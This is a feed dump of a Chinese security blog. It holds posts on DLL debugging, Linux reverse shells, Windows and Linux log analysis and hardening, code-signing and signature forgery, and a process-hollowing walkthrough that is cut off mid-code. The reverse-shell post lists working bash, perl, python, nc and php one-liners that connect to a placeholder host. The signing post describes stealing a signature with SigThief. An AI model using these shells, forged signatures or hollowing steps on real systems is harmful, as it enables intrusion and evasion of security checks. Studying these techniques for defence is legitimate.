src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2.png"></p><p>找到了之前修改的函数头，通过该地址跳转到对应的内存区域。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E5%9C%B0%E5%9D%80%E8%B7%B3%E8%BD%AC.png"></p><p><strong>修改为原始的OEP头，即恢复EB FE 90为55 8B EC即可，下好断点恢复线程跑起来就可以尽情的调试服务代码了，别忘记了恢复线程因为之前暂停了线程的执行。</strong></p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8BOEP.png"></p><p>尽管最后还是弹出了服务无法启动的提示框，但是并不影响到服务的调试。</p><p><img src="/img/DLL%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/%E6%9C%8D%E5%8A%A1%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;VS导出函数&quot;&gt;&lt;a href=&quot;#VS导出函数&quot; class=&quot;headerlink&quot; title=&quot;VS导出函数&quot;&gt;&lt;/a&gt;VS导出函数&lt;/h2&gt;&lt;h3 id=&quot;使用def文件&quot;&gt;&lt;a href=&quot;#使用def文件&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="DLL技术" scheme="http://risks255.github.io/categories/DLL%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="DLL调试" scheme="http://risks255.github.io/tags/DLL%E8%B0%83%E8%AF%95/"/>
    
    <category term="DLL劫持" scheme="http://risks255.github.io/tags/DLL%E5%8A%AB%E6%8C%81/"/>
    
    <category term="DLL导出函数" scheme="http://risks255.github.io/tags/DLL%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux反弹shell</title>
    <link href="http://risks255.github.io/2021/01/06/Linux%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://risks255.github.io/2021/01/06/Linux%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2021-01-06T03:05:45.000Z</published>
    <updated>2021-01-29T12:21:34.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux文件描述符"><a href="#Linux文件描述符" class="headerlink" title="Linux文件描述符"></a>Linux文件描述符</h2><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><pre><code>标准输入standard input 0 （默认设备键盘）标准输出standard output 1（默认设备显示器）错误输出：error output 2（默认设备显示器）</code></pre><h2 id="Linux-重定向"><a href="#Linux-重定向" class="headerlink" title="Linux 重定向"></a>Linux 重定向</h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)</p><pre><code>输入重定向 &lt;和&lt;&lt; 默认为标准输入0输出重定向 &gt;和&gt;&gt; 默认为标准输出1标准输出和标准错误输出 &amp;&gt;文件描述符的复制 &lt;&amp;或者&gt;&amp;exec 绑定重定向 exec number&lt;&gt;filename系统是从左到右执行的???</code></pre><h2 id="Linux反弹shell的几种方式"><a href="#Linux反弹shell的几种方式" class="headerlink" title="Linux反弹shell的几种方式"></a>Linux反弹shell的几种方式</h2><p>经过测试以下几种方式能成功反弹shell</p><p>1、bash反弹</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 //shell版bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1 //网页版</code></pre><p>2、perl反弹</p><pre><code>perl -e &#39;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><p>3、python反弹</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>4、ruby反弹</p><pre><code>目前没找到可以成功反弹的</code></pre><p>5、nc反弹</p><pre><code>nc -e /bin/sh ip port 测试的nc版本v1.12</code></pre><p>6、php反弹</p><pre><code>php -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Linux文件描述符&quot;&gt;&lt;a href=&quot;#Linux文件描述符&quot; class=&quot;headerlink&quot; title=&quot;Linux文件描述符&quot;&gt;&lt;/a&gt;Linux文件描述符&lt;/h2&gt;&lt;p&gt;当Linux启动的时候会默认打开三个文件描述符，分别是：&lt;/p&gt;
&lt;pre&gt;</summary>
      
    
    
    
    <category term="Linux" scheme="http://risks255.github.io/categories/Linux/"/>
    
    
    <category term="反弹shell" scheme="http://risks255.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>日志分析</title>
    <link href="http://risks255.github.io/2021/01/04/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    <id>http://risks255.github.io/2021/01/04/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</id>
    <published>2021-01-04T06:44:20.000Z</published>
    <updated>2021-01-31T03:01:03.047Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><p>重要的事件ID和登录类型情况。</p><table><thead><tr><th>Event ID(2000/XP/2003)</th><th>Event ID(Vista/7/8/2008/2012)</th><th>描述</th><th>日志名称</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>成功登录</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>失败登录</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>成功/失败的账户认证</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>创建用户</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>添加用户到启用安全性的本地组中</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>添加用户到启用安全性的全局组中</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>服务创建错误</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSEC服务服务的启动类型已从禁用更改为自动启动</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>服务创建</td><td>System</td></tr></tbody></table><table><thead><tr><th>登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录</td></tr><tr><td>3</td><td>网络（Network）</td><td>常见的情况就是连接到共享文件夹或共享打印机时，如SMB爆破——蠕虫病毒</td></tr><tr><td>4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动</td></tr><tr><td>5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行</td></tr><tr><td>7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td>8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP</td></tr><tr><td>9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序</td></tr><tr><td>10</td><td>远程交互（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机，如RDP爆破——勒索病毒</td></tr><tr><td>11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p><strong>重要的事件 ID</strong>（安全日志，Security.evtx）</p><ul><li>4624：账户成功登录</li><li>4648：使用明文凭证尝试登录</li><li>4778：重新连接到一台 Windows 主机的会话</li><li>4779：断开到一台 Windows 主机的会话</li></ul><p><strong>远程连接日志</strong></p><p>（<code>应用程序和服务日志</code>-&gt;<code>Microsoft</code>-&gt;<code>Windows</code>-&gt;-<code>TerminalServices</code>-&gt;<code>RemoteConnectionManager</code>-&gt;<code>Operational</code>），重要事件 ID 和含义：</p><ul><li>1149：用户认证成功</li><li>21：远程桌面服务：会话登录成功</li><li>24：远程桌面服务：会话已断开连接</li><li>25：远程桌面服务：会话重新连接成功</li></ul><p>远程连接日志关注 RemoteInteractive（10） 和CachedRemoteInteractive（12）表明使用了 RDP ，因为这些登录类型专用于RDP使用。</p><p><strong>计划任务关注的事件 ID</strong></p><ul><li>4624：账户成功登录</li></ul><p>计划任务事件 Microsoft-Windows-TaskScheduler/Operational.evtx，计划任务 ID 含义：</p><ul><li>100：任务已开始</li><li>102：任务完成</li><li>106：已注册任务（关注点）</li><li>107：在调度程序上触发任务</li><li>110：用户触发的任务</li><li>129：创建任务流程（推出）</li><li>140：任务已更新</li><li>141：任务已删除</li><li>200：运行计划任务</li><li>325：启动请求排队</li></ul><pre><code>更多的依赖windows系统本身的日志记录 审核登录的记录 事件id 4798 LogonUI.exe事件id 4628 Svchost.exe 生成4624事件id 4624 User32.exe 审核成功事件id 4625 User32.exe 审核失败Setup 补丁安全记录系统 服务记录 事件id 7045安装服务ForwardedEvents 未知Windows Vista/7/10Application、Security、System%SystemRoot%\System32\Winevt\Logs *.evtxWindows 2000/Server2003/Windows XP(早期系统xp及以前)Application、Security、System%systemroot%\system32\config *.evt格式</code></pre><h3 id="辅助分析工具"><a href="#辅助分析工具" class="headerlink" title="辅助分析工具"></a>辅助分析工具</h3><p><strong>LogParser 命令行工具</strong></p><p><strong>Log Parser Lizard UI工具</strong></p><h3 id="本地策略设置"><a href="#本地策略设置" class="headerlink" title="本地策略设置"></a>本地策略设置</h3><p>Windows本地安全策略配置，win10默认情况只开启了不允许SAM帐户的匿名枚举。</p><p><img src="/img/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9%E7%AD%96%E7%95%A5.png"></p><p>相关策略设置情况如下所示。</p><pre><code> 网络访问.不允许SAM帐户的匿名枚举 启用 网络访问.可匿名的共享 将后面的值删除 网络访问.可匿名的命名管道 将后面的值删除 网络访问.可远程访问的注册表路径 将后面的值删除 网络访问.可远程访问的注册表的子路径 将后面的值删除 网络访问.限制匿名访问命名管道和共享 启用</code></pre><p>Windows审核策略默认情况下未开启。</p><p><img src="/img/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/%E5%AE%A1%E6%A0%B8%E7%AD%96%E7%95%A5.png"></p><p>相关策略设置情况如下所示。</p><pre><code>审核系统登陆事件 成功，失败 审核帐户管理 成功，失败 审核登陆事件 成功，失败 审核对象访问 成功 审核策略更改 成功，失败 审核特权使用 成功，失败 审核系统事件 成功，失败 </code></pre><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>修改注册表增加安全性。</p><p>禁止默认共享<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters ] 新建DOWRD“AutoShareServer”设置为“0” </p><p>修改默认的TTL值<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]新建DOWRD值为DefaultTTL </p><p>阻止ICMP重定向报文<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ParametersEnableICMPRedirects REG_DWORD 0x0(默认值为0x1)</p><p>以Svchost方式实现的开启服务启动。</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost 的netsvcs包含所有以Svchost启动的服务。</p><h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>1.安装影子系统</p><p>2.采用 EFS 加密硬盘以保护数据</p><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><p>通过日志和计划任务可了解linux系统的最新情况。</p><pre><code>通过.bash_history查看帐号执行过的历史命令，主要分析是否有账户执行过恶意操作。1、root的历史命令：histroy2、其他账号：打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令1、启动项文件：检查方法：    重点关注以下目录中是否存在启动项：    /etc/rc.local 、/etc/rc.d/rc[0~6].d 、/etc/init.d/    可用命令查看：ls -alt /etc/init.d/2、计划任务，重点关注以下目录中是否存在恶意脚本：/var/spool/cron/*/etc/crontab/etc/cron.d/*/etc/cron.daily/*/etc/cron.hourly/*/etc/cron.monthly/*/etc/cron.weekly/3、查询当前服务：检查方法：    chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务    ps aux | grep crond 查看当前服务1、查找可疑目录及文件检查方法：a、敏感目录的文件分析：[类 /tmp 目录，命令目录/usr/bin    /usr/sbin 等]    如使用命令 ls   –alt /tmp/ 查看 tmp 目录下的文件b、处置方法：确认后删除相关目录和文件。2、查找新增文件检查方法：a、find：在指定目录下查找文件    例如 find ./ -mtime 0 -name &quot;*.php&quot;（查找 24 小时内被修改的 php 文件）    -amin -n 查找n分钟以前被访问过的所有文件。    -atime -n 查找n天以前被访问过的所有文件。    -cmin -n 查找n分钟以前文件状态被修改过的所有文件。    -ctime -n 查找n天以前文件状态被修改过的所有文件。    -mmin -n 查找n分钟以前文件内容被修改过的所有文件。    -mtime -n 查找n天以前文件内容被修改过的所有文件。b、处置方法：确认后删除相关目录和文件。3、特殊权限的文件查看检查方法：a、查找 777 权限的jsp文件 ➜➜➜ find / -name *.jsp -perm 777b、查找所有777权限的文件 ➜➜➜ find /  -perm 777linux系统日志一般存放在/var/log/目录下。/var/log/messages记录Linux内核消息及各种应用程序的公共日志信息，包括启动、IO错误、网络错误、程序故障等。对于未使用独立日志文件的应用程序或服务，一般都可以从该文件获得相关的事件记录信息。/var/log.boot.log：记录一些开关机启动的一些服务显示的启动或者关闭的信息。/var/log/cron：记录crond计划任务产生的事件消息。/var/log/dmesg：记录Linux系统在引导过程中的各种事件信息。/var/log/maillog：记录进入或发出系统的电子邮件活动。/var/log/lastlog：最近几次成功登录事件和最后一次不成功登录事件。可以使用lastlog命令检查某特定用户上次登录的时间。如果一个用户从未登录过，lastlog显示Never logged。注意需要以root身份运行该命令。通过lastlog命令查看/var/log/rpmpkgs：记录系统中安装各rpm包列表信息。/var/log/secure：记录用户登录认证过程中的事件信息。secure是应急中最常用的文件，记录用户登录认证过程中的事件信息。如POP3、ssh、telnet、ftp等相关记录，从日志中可看出系统服务是否遭受到安全威胁。/var/log/httpd 目录    Apache HTTP 服务日志。/var/log/xferlog: 记录ftp向服务器传输/拷贝什么文件。/var/log/wtmp：记录每个用户登录、注销及系统启动和停机事件。wtmp日志记录了用户的登录、退出、重启等情况。判断攻击者是否已经登录服务器通过last命令查看。/var/log/utmp：记录当前登录的每个用户的详细信息RedHat /etc/syslog.conf文件中加上：*.warning /var/log/syslog </code></pre><h3 id="常用日志指令"><a href="#常用日志指令" class="headerlink" title="常用日志指令"></a>常用日志指令</h3><pre><code>last：这个命令就是将/var/log/wtmp文件格式化输出。 lastb：这个命令就是将/var/log/btmp文件格式化输出。 lastlog：这个命令就是将/var/log/lastlog文件格式化输出。 who：这个命令就是将/var/log/utmp文件格式化输出ps -auxnestat -anolosf -p pidlsof -i pid chkconfig –list/systemctl list-units –type=service //自启动head/tail 查看头/尾部分数据</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows日志分析&quot;&gt;&lt;a href=&quot;#Windows日志分析&quot; class=&quot;headerlink&quot; title=&quot;Windows日志分析&quot;&gt;&lt;/a&gt;Windows日志分析&lt;/h2&gt;&lt;p&gt;重要的事件ID和登录类型情况。&lt;/p&gt;
&lt;table&gt;
&lt;thead</summary>
      
    
    
    
    <category term="日志分析" scheme="http://risks255.github.io/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
    
    <category term="日志分析" scheme="http://risks255.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
    <category term="加固" scheme="http://risks255.github.io/tags/%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>签名验证</title>
    <link href="http://risks255.github.io/2021/01/04/%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/"/>
    <id>http://risks255.github.io/2021/01/04/%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/</id>
    <published>2021-01-04T06:44:20.000Z</published>
    <updated>2021-02-03T11:38:33.982Z</updated>
    
    <content type="html"><![CDATA[<h2 id="证书生成"><a href="#证书生成" class="headerlink" title="证书生成"></a>证书生成</h2><pre><code>makecert /?和makecert /!        //帮助信息-n   &lt;X509name&gt;     Certificate subject X500 name (eg: CN=Fred Dews)-r                  Create a self signed certificate-sc  &lt;file&gt;         Subject&#39;s certificate file-sv  &lt;pvkFile&gt;      Subject&#39;s PVK file; To be created if not present-ic  &lt;file&gt;         Issuer&#39;s certificate file-iv  &lt;pvkFile&gt;      Issuer&#39;s PVK file-a   &lt;algorithm&gt;    The signature&#39;s digest algorithm.                    &lt;md5|sha1|sha256|sha384|sha512&gt;.  Default to &#39;sha1&#39;makecert -n &quot;cn=root&quot; -r -sv sha1.pvk sha1.cermakecert.exe  -n &quot;cn=root&quot; -r -a sha256 -sv sha256.pvk sha256.cermakecert -n &quot;cn=child&quot; -iv sha1.pvk -ic sha1.cer -sv sha1_child.pvk sha1_child.cer</code></pre><h2 id="证书签名"><a href="#证书签名" class="headerlink" title="证书签名"></a>证书签名</h2><pre><code>pvk2pfx.exe -hUsage:        -pvk &lt;pvk-file&gt;  - input PVK file name.        -spc &lt;spc-file&gt;  - input SPC file name.        -pfx &lt;pfx-file&gt;  - output PFX file name.        -pi &lt;pvk-pswd&gt;   - PVK password.        -po &lt;pfx-pswd&gt;   - PFX password; same as -pi if not given.        -f               - force overwrite existing PFX file.        if -pfx option is not given, an export wizard will pop up. in        this case, options -po and -f are ignored.pvk2pfx -pvk sha1.pvk -pi 123456 -spc sha1.cer -pfx sha1.pfx -fsigntool -h  Valid commands:    sign       --  Sign files using an embedded signature.    timestamp  --  Timestamp previously-signed files.    verify     --  Verify embedded or catalog signatures.    catdb      --  Modify a catalog database.    remove     --  Remove embedded signature(s) or reduce the size of an                   embedded signed file    signtool.exe sign /f sha1.pfx /p 123456 /t http://timestamp.verisign.com/scripts/timstamp.dll SignTest.exesigntool.exe sign /f sha256.pfx /p 123456 /as /fd sha256 /tr http://sha256timestamp.ws.symantec.com/sha256/timestamp SignTest.exe代码签名可选的时间戳服务器：品牌SHA1时间戳SHA256时间戳Symantechttp://timestamp.verisign.com/scripts/timstamp.dllhttp://sha256timestamp.ws.symantec.com/sha256/timestampGlobalSignhttp://timestamp.globalsign.com/scripts/timestamp.dllhttp://timestamp.globalsign.com/?signature=sha2</code></pre><h2 id="证书定位"><a href="#证书定位" class="headerlink" title="证书定位"></a>证书定位</h2><pre><code>Security Directory RVA代码数字签名在PE文件中的偏移位置 Security DirectorySize代表数字签名的长度将这部分内容提取，复制到另一个文件test.exe的尾部，同时使用CFF Explorer修改test.exe对应的Security Directory RVA和Security DirectorySize</code></pre><p><img src="/img/%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/%E7%AD%BE%E5%90%8DRVA.png"></p><h2 id="证书伪造"><a href="#证书伪造" class="headerlink" title="证书伪造"></a>证书伪造</h2><pre><code>开源工具SigThief.pyhttps://github.com/secretsquirrel/SigThief</code></pre><h2 id="证书验证"><a href="#证书验证" class="headerlink" title="证书验证"></a>证书验证</h2><pre><code>powershell Get-AuthenticodeSignature filename //系统自带校验BOOL CheckFileTrust(LPCWSTR lpFileName)&#123;    BOOL bRet = FALSE;    WINTRUST_DATA wd = &#123; 0 &#125;;    WINTRUST_FILE_INFO wfi = &#123; 0 &#125;;    WINTRUST_CATALOG_INFO wci = &#123; 0 &#125;;    CATALOG_INFO ci = &#123; 0 &#125;;    HCATADMIN hCatAdmin = NULL;    if (!CryptCATAdminAcquireContext(&amp;amp; hCatAdmin, NULL, 0))    &#123;        return FALSE;    &#125;    HANDLE hFile = CreateFileW(lpFileName, GENERIC_READ, FILE_SHARE_READ,        NULL, OPEN_EXISTING, 0, NULL);    if (INVALID_HANDLE_VALUE == hFile)    &#123;        CryptCATAdminReleaseContext(hCatAdmin, 0);        return FALSE;    &#125;    DWORD dwCnt = 100;    BYTE byHash[100];    CryptCATAdminCalcHashFromFileHandle(hFile, &amp;amp; dwCnt, byHash, 0);    CloseHandle(hFile);    LPWSTR pszMemberTag = new WCHAR[dwCnt * 2 + 1];    for (DWORD dw = 0; dw &amp; lt; dwCnt; ++dw)    &#123;        wsprintfW(&amp;amp; pszMemberTag[dw * 2], L&quot;%02X&quot;, byHash[dw]);    &#125;    HCATINFO hCatInfo = CryptCATAdminEnumCatalogFromHash(hCatAdmin,        byHash, dwCnt, 0, NULL);    if (NULL == hCatInfo) // 编录中没有则验证是否有嵌入式签名    &#123;        wfi.cbStruct = sizeof(WINTRUST_FILE_INFO);        wfi.pcwszFilePath = lpFileName;        wfi.hFile = NULL;        wfi.pgKnownSubject = NULL;        wd.cbStruct = sizeof(WINTRUST_DATA);        wd.dwUnionChoice = WTD_CHOICE_FILE;        wd.pFile = &amp;amp; wfi;        wd.dwUIChoice = WTD_UI_NONE;        wd.fdwRevocationChecks = WTD_REVOKE_NONE;        wd.dwStateAction = WTD_STATEACTION_IGNORE;        wd.dwProvFlags = WTD_SAFER_FLAG;        wd.hWVTStateData = NULL;        wd.pwszURLReference = NULL;    &#125;    else // 编录中有，验证编录文件的签名是否有效    &#123;        CryptCATCatalogInfoFromContext(hCatInfo, &amp;amp; ci, 0);        wci.cbStruct = sizeof(WINTRUST_CATALOG_INFO);        wci.pcwszCatalogFilePath = ci.wszCatalogFile;        wci.pcwszMemberFilePath = lpFileName;        wci.pcwszMemberTag = pszMemberTag;        wd.cbStruct = sizeof(WINTRUST_DATA);        wd.dwUnionChoice = WTD_CHOICE_CATALOG;        wd.pCatalog = &amp;amp; wci;        wd.dwUIChoice = WTD_UI_NONE;        wd.fdwRevocationChecks = WTD_STATEACTION_VERIFY;        wd.dwProvFlags = 0;        wd.hWVTStateData = NULL;        wd.pwszURLReference = NULL;    &#125;    GUID action = WINTRUST_ACTION_GENERIC_VERIFY_V2;    HRESULT hr = WinVerifyTrust(NULL, &amp;amp; action, &amp;amp; wd);    bRet = SUCCEEDED(hr);    if (NULL != hCatInfo)    &#123;        CryptCATAdminReleaseCatalogContext(hCatAdmin, hCatInfo, 0);    &#125;    CryptCATAdminReleaseContext(hCatAdmin, 0);    delete[] pszMemberTag;    return bRet;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;证书生成&quot;&gt;&lt;a href=&quot;#证书生成&quot; class=&quot;headerlink&quot; title=&quot;证书生成&quot;&gt;&lt;/a&gt;证书生成&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;makecert /?和makecert /!        //帮助信息
-n   &amp;lt;X509nam</summary>
      
    
    
    
    <category term="签名验证" scheme="http://risks255.github.io/categories/%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/"/>
    
    
    <category term="签名验证" scheme="http://risks255.github.io/tags/%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>进程替换技术</title>
    <link href="http://risks255.github.io/2021/01/01/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/"/>
    <id>http://risks255.github.io/2021/01/01/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/</id>
    <published>2021-01-01T06:00:00.000Z</published>
    <updated>2021-01-31T03:00:29.991Z</updated>
    
    <content type="html"><![CDATA[<p><strong>2021年第一篇技术分析文章，有不足之处还请大家多多包涵。</strong></p><p>通过对API的调用，实现文件不落地的一种技术。需要编译选项/DYNAMICBASE or /FIXED 其中一个为NO 目的是取消生成重定位表，这里已/DYNAMICBASE为例子。</p><p><img src="/img/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E6%8A%80%E6%9C%AF/%E7%BC%96%E8%AF%91%E9%80%89%E9%A1%B9.png"></p><pre><code>涉及的API使用情况和相关重定位的计算方式。CreateProcess               //以CREATE_SUSPENDED挂起状态创建进程ZwUnmapviewOfSection       //释放目标进程内存，解除内存映射VirtualAllocEx             //为恶意代码分配新空间WriteProcessMenory         //写入数据（文件头）for(i=0;i&lt;NumberOfSection;i++)    WriteProcessMenory     //写入节区数据SetThreadContext            //设置线程执行位置ResumeThread               //重新启动主线程重定位表存储表达式=2*n+4+4 字节第一个4为VirtualAddress第二个4为SizeofBlockn为重定位表个数重定位表主要修改FF15/FF25类跳转和涉及取内存地址的区域</code></pre><h3 id="源码讲解"><a href="#源码讲解" class="headerlink" title="源码讲解"></a>源码讲解</h3><p>测试代码来源 <a href="https://github.com/m0n0ph1/Process-Hollowing">github</a>，HelloWorld和ProcessHollowing两个进程。</p><p>ProcessHollowing通过main函数代码可以发现CreateHollowedProcess函数是整个进程替换的核心，对其进行重点学习。</p><pre><code>int _tmain(int argc, _TCHAR* argv[])&#123;    char* pPath = new char[MAX_PATH];    GetModuleFileNameA(0, pPath, MAX_PATH);    pPath[strrchr(pPath, &#39;\\&#39;) - pPath + 1] = 0;    strcat(pPath, &quot;helloworld.exe&quot;);    CreateHollowedProcess    (        &quot;cmd&quot;,         pPath    );    system(&quot;pause&quot;);    VirtualFreeEx(        pProcessInfo-&gt;hProcess,        pPEB-&gt;ImageBaseAddress,        pSourceHeaders-&gt;OptionalHeader.SizeOfImage,        MEM_DECOMMIT);    TerminateProcess(pProcessInfo-&gt;hProcess, 0);    delete pStartupInfo;    delete pProcessInfo;    delete pBuffer;    delete pContext;    delete []pPath;    return 0;&#125;</code></pre><p>由于要进行进程替换，所以得先启动一个进程然后将这个进程””挖空”，并填入需要写入的另外一个进程的内容，最后跳转到执行点执行，就完成了整个进程替换的过程。</p><p>通过前半部分的代码可以得知目前正在获取的cmd的进程信息，并且CreateProcessA的第六个参数决定了该进程将以挂起的形式创建。</p><p>通过PROCESS_INFORMATION结构中的hProcess来获取进程句柄，通过PEB结构获取进程的ImageBaseAddress结构。</p><pre><code>pStartupInfo = new STARTUPINFOA();    pProcessInfo = new PROCESS_INFORMATION();    CreateProcessA    (        0,        pDestCmdLine, //cmd                0,         0,         0,         CREATE_SUSPENDED,         0,         0,         pStartupInfo,         pProcessInfo    );    if (!pProcessInfo-&gt;hProcess)    &#123;        printf(&quot;Error creating process\r\n&quot;);        return;    &#125;    pPEB = ReadRemotePEB(pProcessInfo-&gt;hProcess);    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo-&gt;hProcess, pPEB-&gt;ImageBaseAddress);    printf(&quot;Opening source image\r\n&quot;);</code></pre><p>PEB结构如下所示，由于PEB结构较大只留下部分结构信息。</p><pre><code>typedef struct _PEB &#123;    BOOLEAN                 InheritedAddressSpace;    BOOLEAN                 ReadImageFileExecOptions;    BOOLEAN                 BeingDebugged;    BOOLEAN                 Spare;    HANDLE                  Mutant;    PVOID                   ImageBaseAddress;    PPEB_LDR_DATA           LoaderData;    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;    PVOID                   SubSystemData;    PVOID                   ProcessHeap;    PVOID                   FastPebLock;    PPEBLOCKROUTINE         FastPebLockRoutine;    PPEBLOCKROUTINE         FastPebUnlockRoutine;    ······&#125;</code></pre><p>接下来使用CreateFileA的第二个参数GENERIC_READ，来判断获取HelloWorld文件是否存在。如果存在则获取文件大小并分配内存将其加载到内存中，pBuffer就是这段内存的头指针。</p><pre><code>HANDLE hFile = CreateFileA    (        pSourceFile, //HelloWorld文件的位置        GENERIC_READ,         0,         0,         OPEN_ALWAYS,         0,         0    );    if (hFile == INVALID_HANDLE_VALUE)    &#123;        printf(&quot;Error opening %s\r\n&quot;, pSourceFile);        return;    &#125;    dwSize = GetFileSize(hFile, 0);    pBuffer = new BYTE[dwSize];    DWORD dwBytesRead = 0;    ReadFile(hFile, pBuffer, dwSize, &amp;dwBytesRead, 0);</code></pre><p>通过自写的GetLoadedImage来完成镜像文件的装载。</p><pre><code>PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);//载入镜像pSourceHeaders = GetNTHeaders((DWORD)pBuffer);//获取NT结构</code></pre><p>来看一下具体的实现过程，通过DbgHelp提供的LOADED_IMAGE函数就能够完成对内存镜像文件的解析。</p><pre><code>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;    PIMAGE_NT_HEADERS32 pNTHeaders = GetNTHeaders(dwImageBase);    PLOADED_IMAGE pImage = new LOADED_IMAGE();    pImage-&gt;FileHeader =         (PIMAGE_NT_HEADERS32)(dwImageBase + pDosHeader-&gt;e_lfanew);    pImage-&gt;NumberOfSections =         pImage-&gt;FileHeader-&gt;FileHeader.NumberOfSections;    pImage-&gt;Sections =         (PIMAGE_SECTION_HEADER)(dwImageBase + pDosHeader-&gt;e_lfanew +         sizeof(IMAGE_NT_HEADERS32));    return pImage;</code></pre><p>LOADED_IMAGE结构的具体定义如下。</p><pre><code>typedef struct _LOADED_IMAGE &#123;    PSTR                  ModuleName;    HANDLE                hFile;    PUCHAR                MappedAddress;#ifdef _IMAGEHLP64    PIMAGE_NT_HEADERS64   FileHeader;#else    PIMAGE_NT_HEADERS32   FileHeader;#endif    PIMAGE_SECTION_HEADER LastRvaSection;    ULONG                 NumberOfSections;    